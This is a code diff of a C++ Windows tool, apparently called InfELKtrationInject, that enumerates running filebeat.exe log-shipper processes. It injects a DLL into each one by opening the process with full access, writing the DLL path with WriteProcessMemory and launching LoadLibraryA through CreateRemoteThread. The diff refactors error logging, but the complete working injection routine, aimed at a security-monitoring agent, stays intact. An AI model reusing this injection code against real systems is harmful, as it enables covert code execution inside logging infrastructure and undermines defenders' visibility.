@@ -5,6 +5,8 @@
 #include <TlHelp32.h>
 #include <tchar.h>
 
+#include "Logger.h"
+
 #define DLL_FILEPATH_MAX_LENGTH 120
 
 // code references:
@@ -12,35 +14,28 @@
 // https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
 
 BOOL inject_dll();
-void print_error(const char*);
 
-int main()
+int main(int argc, char **argv)
 {
-    std::cout << "Hello World!\n";
-
     inject_dll();
 }
 
 BOOL inject_dll() {
     HANDLE hSnapshot, hProcess;
     PROCESSENTRY32 processEntry;
-    TCHAR targetProcess[MAX_PATH] = TEXT("filebeat.exe");
-    //TCHAR targetProcess[MAX_PATH] = TEXT("powershell.exe");
-    TCHAR targetDll[MAX_PATH] = TEXT("KERNEL32.DLL");
     CHAR dllFilename[DLL_FILEPATH_MAX_LENGTH] = "C:\\Users\\Administrator\\source\\repos\\InfELKtrationInject\\x64\\Debug\\InfELKtrationInjectLib.dll";
     DWORD targetPid = 0;
     DWORD targetPids[5] = { 0 };
     DWORD targetPidCount = 0;
     LPVOID szDllFilepath;
-    DWORD_PTR target_kernel32_base;
-    HMODULE hKernel32_self;
-    DWORD loadLibraryOffset;
+    HMODULE hKernel32;
     LPTHREAD_START_ROUTINE loadLibrary;
 
     // get snapshot of running processes on the system
     hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) {
-        print_error("CreateToolhelp32Snapshot");
+        Logger::Error("CreateToolhelp32Snapshot failed");
+        Logger::LastError();
         return false;
     }
 
@@ -49,14 +44,15 @@ BOOL inject_dll() {
 
     // get the first process
     if (!Process32First(hSnapshot, &processEntry)) {
-        print_error("Process32First");
+        Logger::Error("Process32First failed");
+        Logger::LastError();
         return false;
     }
 
     // loop through processes
     do {
-        if (CompareStringOrdinal(targetProcess, -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
-            wprintf(L"found target process %s (pid=%d)\n", targetProcess, processEntry.th32ProcessID);
+        if (CompareStringOrdinal(L"filebeat.exe", -1, processEntry.szExeFile, -1, false) == CSTR_EQUAL) {
+            Logger::Info("Found filebeat.exe (pid=%d)", processEntry.th32ProcessID);
             targetPids[targetPidCount++] = processEntry.th32ProcessID;
         }
     } while (Process32Next(hSnapshot, &processEntry));
@@ -64,7 +60,7 @@ BOOL inject_dll() {
     CloseHandle(hSnapshot);
 
     if (!targetPids[0]) {
-        _tprintf(TEXT("failed to find target process %s\n"), targetProcess);
+        Logger::Error("Failed to find a filebeat.exe process");
         return false;
     }
 
@@ -73,54 +69,58 @@ BOOL inject_dll() {
     for (DWORD i = 0; i < targetPidCount; i++) {
         targetPid = targetPids[i];
 
-        printf("injecting into pid %d\n", targetPid);
+        Logger::Info("Injecting into pid %d", targetPid);
     
         // open handle to target process
         hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
         if (!hProcess) {
-            print_error("hProcess");
+            Logger::Error("OpenProcess failed");
+            Logger::LastError();
             return false;
         }
     
-        printf("opened handle to target process: 0x%p\n", hProcess);
+        Logger::Info("Opened handle to target process: 0x%p", hProcess);
     
         // allocate memory for the dll filepath
         szDllFilepath = VirtualAllocEx(hProcess, NULL, DLL_FILEPATH_MAX_LENGTH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!szDllFilepath) {
-            print_error("VirtualAllocEx");
+            Logger::Error("VirtualAllocEx failed");
+            Logger::LastError();
             return false;
         }
     
-        printf("allocated mem for dll filepath: 0x%p\n", szDllFilepath);
+        Logger::Info("Allocated mem for dll filepath: 0x%p", szDllFilepath);
     
         // write dll path into target process
         if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
-            print_error("WriteProcessMemory");
+            Logger::Error("WriteProcessMemory failed");
+            Logger::LastError();
             return false;
         }
     
-        puts("copied dll path into target process");
-    
-        loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"Kernel32"), "LoadLibraryA");
+        Logger::Info("Copied dll path into target process");
+
+        hKernel32 = GetModuleHandleA("Kernel32");
+        if (!hKernel32) {
+            Logger::Error("GetModuleHandleA failed");
+            Logger::LastError();
+            return false;
+        }
+
+        loadLibrary = (LPTHREAD_START_ROUTINE)GetProcAddress(hKernel32, "LoadLibraryA");
+        if (!loadLibrary) {
+            Logger::Error("GetProcAddress failed");
+            Logger::LastError();
+            return false;
+        }
+
         CreateRemoteThread(hProcess, NULL, NULL, loadLibrary, szDllFilepath, NULL, NULL);
     
-        puts("executed DLL in target process");
+        Logger::Info("Executed DLL in target process");
     
         //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
         CloseHandle(hProcess);
     }
 
     return true;
-}
-
-void print_error(const char* msg) {
-    DWORD eNum;
-    char error[256];
-
-    eNum = GetLastError();
-    FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS, NULL, eNum, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error, 256, NULL);
-
-    error[strcspn(error, ".\r\n")] = 0;
-
-    printf("ERROR: %s failed (%d): %s\n", msg, eNum, error);
 }
